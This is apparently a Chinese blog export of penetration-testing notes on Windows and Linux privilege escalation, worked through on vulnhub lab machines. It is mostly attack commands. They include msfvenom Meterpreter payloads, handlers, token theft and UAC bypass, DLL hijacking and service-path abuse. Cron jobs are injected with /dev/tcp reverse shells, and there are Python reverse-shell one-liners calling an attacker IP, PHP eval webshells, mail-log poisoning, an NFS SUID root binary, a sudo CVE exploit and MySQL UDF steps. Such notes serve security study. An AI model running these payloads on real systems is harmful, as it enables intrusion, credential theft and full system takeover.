#调用运行cmd</p><p>#进程注入（降权&amp;提权）</p><p>举例：win系统中任务管理器，有两个进程exe，a进程用户为administrator,b进程为system（权限高），a进程注入b进程，变成system，提权；b进程注入a进程，变成administrator，降权</p><p><font style="color:#000000;">MSF：<br></font>利用前面讲的溢出漏洞，</p><p><font style="color:#000000;">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.139.141 LPORT&#x3D;3333 -f exe -o msf.exe<br></font>生成的msf.exe在&#x2F;root目录下</p><p>在启动msfconsole监听端口</p><p>攻击机msfconsole配置监听会话</p><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 0.0.0.0</p><p>set lport 3333</p><p>exploit</p><p>在监听端口拿到的shell</p><p>ps &#x2F;&#x2F;查看进程</p><p>migrate PID &#x2F;&#x2F;迁移对应PID</p><p>从msf.exe开始迁移到PID</p><p>此时再getuid就获取到迁移的PID的User权限了了</p><p>CS:&#x2F;&#x2F;普通用户注入进程和窃取都没办法执行，至少得administrator</p><p>ps &#x2F;&#x2F;查看进程</p><p>inject PID &#x2F;&#x2F;注入对应PID</p><p>#令牌窃取（降权&amp;提权）</p><p>MSF：</p><p>use incognito</p><p>list_tokens -u</p><p>获取到能窃取的用户，其中里面有NT AUTHORITY\SYSTEM</p><p>impersonate_token “NT AUTHORITY\SYSTEM”</p><p>也可以直接输入getsystem命令提权，msf会自动尝试可使用的方式提权</p><p>CS:</p><p>ps &#x2F;&#x2F;查看进程</p><p>steal_token PID &#x2F;&#x2F;窃取进程令牌</p><p>spawnu PID &#x2F;&#x2F;窃取进程令牌上线</p><h3 id="Win10-11-BypassUAC自动提权-MSF-UACME"><a href="#Win10-11-BypassUAC自动提权-MSF-UACME" class="headerlink" title="Win10&amp;11-BypassUAC自动提权-MSF&amp;UACME"></a>Win10&amp;11-BypassUAC自动提权-MSF&amp;UACME</h3><p>UAC-&gt;User account controller</p><p>在某些win系统中，运行exe需要点击弹出窗口的是或者否选择运行或者不允许软件</p><p>类似下面这种</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724723287835-c789085c-1f46-4e5a-acae-971eb076a0a4.png"></p><p>直接在cmd窗口里面执行会显示拒绝访问</p><p>为了远程执行目标的exe或者bat可执行文件需要绕过此安全机制</p><p>在用户到系统权限自动提权中也学通过BypassUAC实现自动化提权</p><p>绕过项目：MSF内置，Powershell渗透框架，UACME项目(推荐)</p><p>开启UAC和未开启UAC时,CS&#x2F;MSF默认getsystem提权影响(进程注入等)</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xx.xx.xx.xx lport&#x3D;xx -f exe -o msf.exe</p><p>1、MSF模块：</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;ask</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassua</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_sluihijack</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_silentcleanup</p><p>2、UACME项目：</p><p><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p><p>Akagi64.exe 编号 调用执行</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724721100788-beeafb14-f9a1-4ca7-a1ef-76ca17586089.png"></p><p>如果运行有问题尝试修改SDK版本解决</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724721550529-1d7a65b0-66f8-4bc1-bea0-326390c5661d.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724726525834-a177585e-6efc-4bb5-948c-cb08e05647b1.png"></p><p>对这五个全部修改</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724726559654-aede9dff-e5d8-47d3-82f9-b78024b8190e.png"></p><p>生成</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724726678655-257bd3c8-5337-4ee5-af81-af355857d890.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724726704612-951ea142-10e7-4461-a25e-7e3376691cc0.png"></p><p>利用文件在下面文件夹的output文件夹下</p><p>取出来拿到要绕过UAC的机器上，Akagi64.exe 数字编号 要绕过的软件.exe</p><p>eg：Akagi64.exe 41 C:\test\msf.exe</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724727739945-5c40f1c3-83d6-4cd3-ac38-036f7ce5a6a3.png"></p><p>再msf提权或者其他执行类提权时候命令行执行有可能卡住，就可能是UAC导致</p><h3 id="Windows-DLL劫持提权应用配合MSF-FlashFXP"><a href="#Windows-DLL劫持提权应用配合MSF-FlashFXP" class="headerlink" title="Windows-DLL劫持提权应用配合MSF-FlashFXP"></a>Windows-DLL劫持提权应用配合MSF-FlashFXP</h3><p>原理：Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p><p>1、应用程序加载的目录</p><p>2、C:\Windows\System32</p><p>3、C:\Windows\System</p><p>4、C:\Windows</p><p>5、当前工作目录Current Working Directory，CWD</p><p>6、在PATH环境变量的目录（先系统后用户）</p><p>过程：信息收集-进程调试-制作dll并上传-替换dll-等待启动应用成功</p><p>检测：ChkDllHijack 火绒剑</p><p>项目：<a href="https://github.com/anhkgg/anhkgg-tools">https://github.com/anhkgg/anhkgg-tools</a></p><p>利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xx.xx.xx.xx lport&#x3D;xx -f dll -o xiaodi.dll</p><p>提前信息收集相关软件及DLL问题程序，本地调试成功后覆盖DLL实现利用</p><h3 id="Windows-不带引号服务路径配合MSF-MacroExpert"><a href="#Windows-不带引号服务路径配合MSF-MacroExpert" class="headerlink" title="Windows-不带引号服务路径配合MSF-MacroExpert"></a>Windows-不带引号服务路径配合MSF-MacroExpert</h3><p>前提：需要上传到指定目录的权限</p><p>原理：服务路径配置由于目录空格问题，可上传文件配合解析恶意触发执行</p><p>路径带空格且没被双引号闭合</p><p>过程：检测服务权限配置-制作文件并上传-服务路径指向解析-等待调用成功</p><p>检测命令：</p><p>wmic service get name,displayname,pathname,startmode |findstr &#x2F;i “Auto” |findstr &#x2F;i &#x2F;v “C:\Windows\“ |findstr &#x2F;i &#x2F;v “””</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724738357707-0c37fa9a-5cb7-4447-880f-4d552fec6bb7.png"></p><p>上传反弹exe，设置好对应执行名后，执行sc start “Macro Expert”</p><p>就比如有一个服务的启动是C:\program files\xx.exe</p><p>此时上传C:\program.exe，服务就会找到他，把后面空格之后的当作参数</p><h3 id="Win2012-不安全的服务权限配合MSF-NewServices"><a href="#Win2012-不安全的服务权限配合MSF-NewServices" class="headerlink" title="Win2012-不安全的服务权限配合MSF-NewServices"></a>Win2012-不安全的服务权限配合MSF-NewServices</h3><p>原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。</p><p>过程：检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</p><p>检测脚本：accesschk.exe -uwcqv “administrator” *</p><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p><p>修改test服务指向Program.exe</p><p>sc config “test” binpath&#x3D; “C:\Program.exe”</p><p>sc start test</p><p>实战中基本没有，webshell没有权限执行那个工具，需要高权限</p><h3 id="综合类检测项目："><a href="#综合类检测项目：" class="headerlink" title="综合类检测项目："></a>综合类检测项目：</h3><p><a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p><p>类似对整机进行基线检查</p><p>PEAS-ng适用于Windows和Linux&#x2F;Unix*和MacOS的权限提升工具。</p><p>winPEAS.bat &gt; result.txt</p><p>winPEASany.exe log&#x3D;result.txt</p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> 内网 </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux权限提升</title>
      <link href="/2024/09/17/%E5%86%85%E7%BD%91/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
      <url>/2024/09/17/%E5%86%85%E7%BD%91/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>当前主机的操作系统</p><p>hostnamectl</p><p>cat &#x2F;etc&#x2F;*-release</p><p>lsb_release -a </p><p>cat &#x2F;etc&#x2F;lsb-release # Debain</p><p>cat &#x2F;etc&#x2F;redhat-release # Redhat</p><p>cat &#x2F;etc&#x2F;centos-release # Centos</p><p>cat &#x2F;etc&#x2F;os-release # Ubuntu</p><p>cat &#x2F;etc&#x2F;issue</p><p>当前主机的内核版本</p><p>hostnamectl</p><p>uname -a </p><p>cat &#x2F;proc&#x2F;version</p><p>dmesg | grep “Linux version”</p><h2 id="内核漏洞筛选："><a href="#内核漏洞筛选：" class="headerlink" title="内核漏洞筛选："></a>内核漏洞筛选：</h2><p>下面的msf测试均在kali中进行</p><p>MSF检测：</p><p>run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</p><p>提权脚本:</p><p>筛选可能存在提权漏洞的信息，主要是内核漏洞提权</p><p><a href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a></p><p><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a></p><p><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p><p><a href="https://github.com/belane/linux-soft-exploit-suggester">https://github.com/belane/linux-soft-exploit-suggester</a></p><p>综合脚本:</p><p>包含一些其他CVE，但内核漏洞提权效果不如上面</p><p><a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p><p><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p><p><a href="https://github.com/redcode-labs/Bashark">https://github.com/redcode-labs/Bashark</a></p><p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><h2 id="web-linux应用场景："><a href="#web-linux应用场景：" class="headerlink" title="web-linux应用场景："></a>web-linux应用场景：</h2><p>获取到Web权限在Linux服务器上时进行的内核漏洞提权</p><h3 id="常见内核漏洞案例："><a href="#常见内核漏洞案例：" class="headerlink" title="常见内核漏洞案例："></a>常见内核漏洞案例：</h3><p>dirtycow（CVE-2016-5159）</p><p>Pwnkit (CVE-2021-4034) </p><p>Dirty Pipe（CVE-2022-0847)</p><p>SUDO （CVE-2021-3156）</p><p>大脏牛 (CVE-2017–1000405)</p><p>CVE-2017-16995</p><p>CVE-2021-3560</p><p>CVE-2023-1829 </p><p>CVE-2022-2588 </p><p>CVE-2021-3493</p><p>CVE-2022-32250</p><p>CVE-2023-3269</p><p>CVE-2022-0995</p><p>CVE-2022-2639</p><p>CVE-2023-0386</p><p>…</p><h4 id="Web-内核溢出-Dcow"><a href="#Web-内核溢出-Dcow" class="headerlink" title="Web&amp;内核溢出-Dcow"></a>Web&amp;内核溢出-Dcow</h4><p>复现环境：<a href="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/</a></p><p>1、信息收集：</p><p>&#x2F;&#x2F;全端口扫描</p><p>nmap -p1-65535 192.168.139.0&#x2F;24</p><p>2、Web漏洞利用：&#x2F;&#x2F;msf</p><p>search drupal</p><p>use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2</p><p>set rhost 192.168.46.144</p><p>set rport 1898</p><p>run</p><p>3、内核提权：</p><p>upload &#x2F;root&#x2F;linux-exploit-suggester.sh &#x2F;tmp&#x2F;1.sh</p><p>shell</p><p>cd &#x2F;tmp</p><p>chmod +x 1.sh</p><p>.&#x2F;1.sh</p><p><a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p><p>upload &#x2F;root&#x2F;dcow.cpp &#x2F;tmp&#x2F;dcow.cpp</p><p>g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dcow dcow.cpp -lutil      &#x2F;有可能编译不了，如果目标机器上不能变异就在攻击机编译完，直接从攻击机上传编译完的 </p><p>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p><p>.&#x2F;dcow</p><p>su root</p><p>该漏洞只能利用一次，做完需要还原</p><h4 id="Web-内核溢出-Pwnkit"><a href="#Web-内核溢出-Pwnkit" class="headerlink" title="Web&amp;内核溢出-Pwnkit"></a>Web&amp;内核溢出-Pwnkit</h4><p>复现环境：<a href="https://www.vulnhub.com/entry/darkhole-1,724/">https://www.vulnhub.com/entry/darkhole-1,724/</a></p><p>入口点是该网站修改用户名抓取id可以修改，后登录发现上传文件可以通过.phtml绕过，拿到webshell</p><p>1、信息收集：</p><p>nmap -p1-65535 192.168.139.0&#x2F;24</p><p>2、Web漏洞利用：</p><p>重置管理密码-上传1.phtml-反弹MSF，哥斯拉里面PMeterpreter模块可以反弹到msf上</p><p>use exploit&#x2F;multi&#x2F;handler </p><p>set payload php&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 0.0.0.0</p><p>set lport 6666</p><p>run</p><p>3、内核提权</p><p>upload &#x2F;root&#x2F;linux-exploit-suggester.sh &#x2F;tmp&#x2F;1.sh</p><p>shell</p><p>cd &#x2F;tmp</p><p>chmod +x 1.sh</p><p>.&#x2F;1.sh</p><p>search cve_2021_4034</p><p>use exploit&#x2F;linux&#x2F;local&#x2F;cve_2021_4034_pwnkit_lpe_pkexec</p><p>set session x</p><p>run</p><p>getuid</p><p>shell</p><p>cd &#x2F;root</p><p>cat root.txt</p><h4 id="Web-内核溢出-DirtyPipe"><a href="#Web-内核溢出-DirtyPipe" class="headerlink" title="Web&amp;内核溢出-DirtyPipe"></a>Web&amp;内核溢出-DirtyPipe</h4><p><a href="https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/">https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/</a></p><p>1、信息收集：</p><p>nmap -p1-65535 192.168.139.0&#x2F;24</p><p>2、Web漏洞利用</p><p>扫描发现-抓包分析-文件写入-反弹MSF</p><p>gobuster dir -u <a href="http://192.168.139.146/">http://192.168.139.146</a> -x php,bak,txt,html -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt</p><p>扫到一个php文件为漏洞入口，可以上传一句话木马拿到webshell，下面为抓包的流量，可以看到post传入的时候也会明文显示文件名</p><p>message&#x3D;<?php eval($_POST["pass"]);?>&amp;file&#x3D;xd.php</p><p>哥斯拉webshell连上去接着用PMeterpreter模块打msf</p><p>use exploit&#x2F;multi&#x2F;handler </p><p>set payload php&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 0.0.0.0</p><p>set lport 6666</p><p>run</p><p>3、内核提权</p><p>upload &#x2F;root&#x2F;linux-exploit-suggester.sh &#x2F;tmp&#x2F;1.sh</p><p>shell</p><p>cd &#x2F;tmp</p><p>chmod +x 1.sh</p><p>.&#x2F;1.sh   &#x2F;&#x2F;执行完发现有cve_2022_0847可以利用</p><p>search cve_2022_0847</p><p>use exploit&#x2F;linux&#x2F;local&#x2F;cve_2022_0847_dirtypipe</p><p>set session x</p><p>set lhost xx.xx.xx.xx</p><p>run</p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>CVE-2023-0386</p><p><a href="https://mp.weixin.qq.com/s/Z6sVuMrYMZV8WD6z1-U95Q">https://mp.weixin.qq.com/s/Z6sVuMrYMZV8WD6z1-U95Q</a></p><h3 id="Web-用户-NFS安全"><a href="#Web-用户-NFS安全" class="headerlink" title="Web&amp;用户-NFS安全"></a>Web&amp;用户-NFS安全</h3><p>NFS是一种基于TCP&#x2F;IP 传输的网络文件系统协议，通过使用NFS协议，客户机可以像访问本地目录一样访问远程服务器中的共享资源。</p><p><a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a></p><p><a href="https://www.vulnhub.com/entry/hacksudo-2-hackdudo,667/">https://www.vulnhub.com/entry/hacksudo-2-hackdudo,667/</a></p><p>提升条件：NFS服务开启和web或用户权限进行利用</p><p>1、信息收集：</p><p>nmap 192.168.1.6</p><p><a href="http://192.168.1.6/file.php?file=/etc/passwd">http://192.168.1.6/file.php?file=/etc/passwd</a></p><p>2、NFS服务利用</p><p>showmount -e 192.168.1.6    链接</p><p>mkdir nfs</p><p>mount -t nfs 192.168.1.6:&#x2F;mnt&#x2F;nfs .&#x2F;nfs  把攻击机的nfs和目标机器的&#x2F;mnt&#x2F;nfs同步，注意如果上传马要给权限</p><p>chmod 777 shell.php</p><p>3、配合SUID提权</p><p>注意gcc编译机器与目标机内核版本相似</p><p>直接cp复制机器上的suid文件也可以，改名再上传</p><p>#include&lt;stdlib.h&gt;</p><p>#include&lt;unistd.h&gt;</p><p>int main()</p><p>{</p><p>setuid(0);</p><p>system(“id”);</p><p>system(“&#x2F;bin&#x2F;bash”);</p><p>}</p><p>gcc getroot.c -o getroot</p><p>cp getroot &#x2F;root&#x2F;nfs #复制bash到挂载目录下</p><p>chmod +s getroot #赋予suid权限</p><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null 再看看是否加入</p><p>cd &#x2F;mnt&#x2F;nfs # 目标机</p><p>.&#x2F;getroot # 目标机</p><h3 id="Web-用户-Cron任务"><a href="#Web-用户-Cron任务" class="headerlink" title="Web&amp;用户-Cron任务"></a>Web&amp;用户-Cron任务</h3><p><a href="https://www.vulnhub.com/entry/jarbas-1,232/">https://www.vulnhub.com/entry/jarbas-1,232/</a></p><p>提升条件：Web或用户权限进行查看，任务文件可修改</p><p>1、信息收集：</p><p><a href="http://192.168.139.152/access.html">http://192.168.139.152/access.html</a></p><p>2、权限获取：</p><p><a href="http://192.168.139.152:8080/">http://192.168.139.152:8080/</a></p><p>Jenkins创建任务，添加反弹，立即构建</p><p>这边添加的反弹可能是web用户或者普通用户权限 </p><p>3、权限提升：</p><p>cat &#x2F;etc&#x2F;crontab</p><p>cat &#x2F;etc&#x2F;script&#x2F;CleaningScript.sh #查看脚本内容</p><p>ls -lia &#x2F;etc&#x2F;script&#x2F;CleaningScript.sh #查看对任务文件的权限</p><p>echo “&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.139.141&#x2F;66 0&gt;&amp;1” &gt;&gt; &#x2F;etc&#x2F;script&#x2F;CleaningScript.sh</p><h3 id="Linux系统提权-Web-用户-PATH变量"><a href="#Linux系统提权-Web-用户-PATH变量" class="headerlink" title="Linux系统提权-Web&amp;用户-PATH变量"></a>Linux系统提权-Web&amp;用户-PATH变量</h3><p><a href="https://www.vulnhub.com/entry/symfonos-1,322/">https://www.vulnhub.com/entry/symfonos-1,322/</a></p><p>提升条件：存在SUID的应用中能可逆向出执行命令，加用户权限</p><p>目标开放445端口，判断有smb服务 </p><p>1、信息收集：</p><p>smbclient -L 192.168.139.153</p><p>2、权限获取：</p><p>smbclient &#x2F;&#x2F;192.168.139.153&#x2F;anonymous</p><p>get attention.txt</p><p>smbclient &#x2F;&#x2F;192.168.139.153&#x2F;helios -U helios</p><p>helios \ qwerty</p><p>3、漏洞利用&#x2F;&#x2F;从上面可以得到一个wordpress网站 wpscan kali自带</p><p>wpscan –url <a href="http://192.168.139.153/h3l105/">http://192.168.139.153/h3l105/</a> –plugins-detection aggressive</p><p>searchsploit mail masta 1.0   &#x2F;&#x2F;kali自带漏洞库</p><p><a href="http://192.168.139.153/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd">http://192.168.139.153/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</a></p><p>telnet 192.168.139.153 25</p><p>MAIL FROM: MALABIS</p><p>RCPT TO: helios</p><p>data</p><?php system($_GET['shell']); ?><p>.</p><p>QUIT</p><p><a href="http://192.168.139.153/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&shell=/bin/bash%20-i%20%3E&%20/dev/tcp/192.168.139.141/6666%200%3E&1">http://192.168.139.153/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;shell=/bin/bash%20-i%20%3E&amp;%20/dev/tcp/192.168.139.141/6666%200%3E&amp;1</a></p><p>python -c ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.139.128”,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”]);’</p><p>4、权限提升：</p><p>&#x2F;opt&#x2F;statuscheck里有执行curl</p><p>自己的文件自己能修改，所以curl能chmod 777</p><p>python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p>strings &#x2F;opt&#x2F;statuscheck</p><p>cd &#x2F;tmp</p><p>echo “&#x2F;bin&#x2F;sh” &gt; curl</p><p>chmod 777 curl      </p><p>export PATH&#x3D;&#x2F;tmp:$PATH</p><p>echo $PATH</p><p>&#x2F;opt&#x2F;statuscheck</p><h3 id="SUID-SUDO应用场景："><a href="#SUID-SUDO应用场景：" class="headerlink" title="SUID&amp;SUDO应用场景："></a>SUID&amp;SUDO应用场景：</h3><p>获取到Web权限或普通用户在Linux服务器上时进行的SUID&amp;SUDO提权</p><p>SUID (Set owner User ID up on execution)是给予文件的一个特殊类型的文件权限。在Linux&#x2F;Unix中，当一个程序运行的时候，程序将从登录用户处继承权限。SUID被定义为给予一个用户临时的（程序&#x2F;文件）所有者的权限来运行一个程序&#x2F;文件。用户在执行程序&#x2F;文件&#x2F;命令的时候，将获取文件所有者的权限以及所有者的UID和GID。</p><p>SUDO权限是root把本来只能超级用户执行的命令赋予普通用户执行，系统管理员集中的管理用户使用权限和使用主机，配置文件：&#x2F;etc&#x2F;sudoers，除此配置之外的问题，SUDO还有两个CVE漏洞（CVE-2019-14287 CVE-2021-3156）。</p><p>#利用参考：</p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p>这个网站里面可以找一下参考</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724807930632-6551ba3c-b3e4-4460-b9c3-0e43d4ea9ca2.png"></p><h4 id="Web-用户-Suid"><a href="#Web-用户-Suid" class="headerlink" title="Web&amp;用户-Suid"></a>Web&amp;用户-Suid</h4><p>1、SUID&amp;GUID</p><p>环境：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p><p>命令：SUID GUID</p><p>查找suid文件</p><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p>find &#x2F; -perm -g&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p>项目：LinEnum PEASS-ng</p><p>eg：find . &#x2F; -exec “whoami”;</p><p>&#x2F;usr&#x2F;bin&#x2F;find . -exec ‘&#x2F;bin&#x2F;sh’ ;</p><p>find &#x2F; -name 123 -exec ‘&#x2F;bin&#x2F;sh’ ;</p><p>&#x2F;usr&#x2F;bin&#x2F;sudo find &#x2F;flag -exec cat &#x2F;f* ;</p><p>2、SUID&amp;SUDO</p><p>环境：<a href="https://www.vulnhub.com/entry/toppo-1,245/">https://www.vulnhub.com/entry/toppo-1,245/</a></p><p>搭建：创建任意虚拟机，然后将toppo.vmdx文件改名并替换原来的vmdx文件</p><p>SUID：</p><p>&#x2F;usr&#x2F;bin&#x2F;python2.7 -c ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.139.141”,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”]);’</p><h4 id="Web-用户-Sudo-cve-用户是因为git这种项目部署的时候需要普通用户权限支持"><a href="#Web-用户-Sudo-cve-用户是因为git这种项目部署的时候需要普通用户权限支持" class="headerlink" title="Web&amp;用户-Sudo(cve)&#x2F;&#x2F;用户是因为git这种项目部署的时候需要普通用户权限支持"></a>Web&amp;用户-Sudo(cve)&#x2F;&#x2F;用户是因为git这种项目部署的时候需要普通用户权限支持</h4><p>1、SUDO</p><p>环境：<a href="https://www.vulnhub.com/entry/toppo-1,245/">https://www.vulnhub.com/entry/toppo-1,245/</a></p><p>搭建：创建任意虚拟机，然后将toppo.vmdx文件改名并替换原来的vmdx文件</p><p>SUDO:</p><p>cat &#x2F;etc&#x2F;sudoers</p><p>&#x2F;usr&#x2F;bin&#x2F;awk ‘BEGIN {system(“&#x2F;bin&#x2F;sh”)}’    &#x2F;&#x2F;利用sudoers里面的awk去新开一个root权限的sh</p><p>2、SUDO-CVE</p><p>环境：<a href="https://www.vulnhub.com/entry/devguru-1,620/">https://www.vulnhub.com/entry/devguru-1,620/</a></p><p>-信息收集：</p><p>80，8585</p><p><a href="http://192.168.139.150/.git/">http://192.168.139.150/.git/</a></p><p><a href="http://192.168.139.150/adminer.php">http://192.168.139.150/adminer.php</a></p><p><a href="http://192.168.139.150/backend/backend/auth">http://192.168.139.150/backend/backend/auth</a></p><p><a href="http://192.168.139.150:8585/">http://192.168.139.150:8585/</a></p><p><a href="http://192.168.139.150:8585/admin">http://192.168.139.150:8585/admin</a></p><p>-git泄漏(利用点)</p><p>python GitHack.py <a href="http://192.168.139.150/.git/">http://192.168.139.150/.git/</a></p><p>-访问管理（Web入口）：</p><p>adminer.php 添加用户名密码 登录后台 模版 写入Shell</p><p>function onStart(){</p><p>&#x2F;&#x2F;蚁剑连接</p><p>eval($_POST[“pass”]);</p><p>}</p><p>-找备份寻突破（升权）：</p><p>&#x2F;var&#x2F;backup&#x2F;app.ini.bak 修改用户密码 登录后台 写入反弹</p><p>bash -c “exec bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.139.141&#x2F;5555 0&gt;&amp;1” </p><p>-利用sudo提权（cve）：</p><p>sudo -l</p><p>sudo -u#-1 sqlite3 &#x2F;dev&#x2F;null ‘.shell &#x2F;bin&#x2F;sh’</p><p>git源码泄露 &#x3D;&gt; 找到数据库密码，登入 &#x3D;&gt; 找到cms后台用户密码，改为已知密码 &#x3D;&gt; 登入cms后台，写shell（低权限）</p><p>gitea数据库配置备份文件泄露 &#x3D;&gt; 连接gitea数据库，找到gitea的用户密码 &#x3D;&gt; 登入gitea，写shell（更高权限） &#x3D;&gt; 提权。</p><p>3、SUDO-CVE</p><p>环境：kali2020</p><p>sudo: 1.8.2 - 1.8.31p2</p><p>sudo: 1.9.0 - 1.9.5p1</p><p>-判断：sudoedit -s &#x2F; 报错存在</p><p>-利用：</p><p>git clone <a href="https://github.com/blasty/CVE-2021-3156.git">https://github.com/blasty/CVE-2021-3156.git</a></p><p>cd CVE-2021-3156</p><p>make</p><p>chmod a+x sudo-hax-me-a-sandwich</p><p>.&#x2F;sudo-hax-me-a-sandwich 0</p><h3 id="Web-用户-UDF提权-数据库类型"><a href="#Web-用户-UDF提权-数据库类型" class="headerlink" title="Web&amp;用户-UDF提权&#x2F;&#x2F;数据库类型"></a>Web&amp;用户-UDF提权&#x2F;&#x2F;数据库类型</h3><p><a href="https://www.vulnhub.com/entry/raven-2,269/">https://www.vulnhub.com/entry/raven-2,269/</a></p><p>1、信息收集：</p><p><a href="http://192.168.139.155/vendor/">http://192.168.139.155/vendor/</a></p><p>2、Web权限获取：</p><p>searchsploit phpmailer &#x2F;&#x2F;kali漏洞库查找，查找完之后后面会跟利用文件或者利用方法，40969就是利用脚本</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724895498697-cd063987-ddd5-406d-b77e-8da84acca8f7.png"></p><p>find &#x2F; -name 40969.py   &#x2F;&#x2F;修改脚本相关的ip地址和后门路径</p><p>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;40969.py p.py</p><p>python p.py</p><p>拿到web权限</p><p>3、MYSQL-UDF提权：</p><p>前提：需要数据库高权限</p><p>-编译UDF.so</p><p>searchsploit udf</p><p>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;1518.c . #复制到当前所在文件夹</p><p>gcc -g -shared -Wl,-soname,1518.so -o udf.so 1518.c -lc</p><p>python -m http.server 8080    攻击机起一个py服务器让对方去下载   </p><p>-下载到目标上</p><p>python -c ‘import pty; 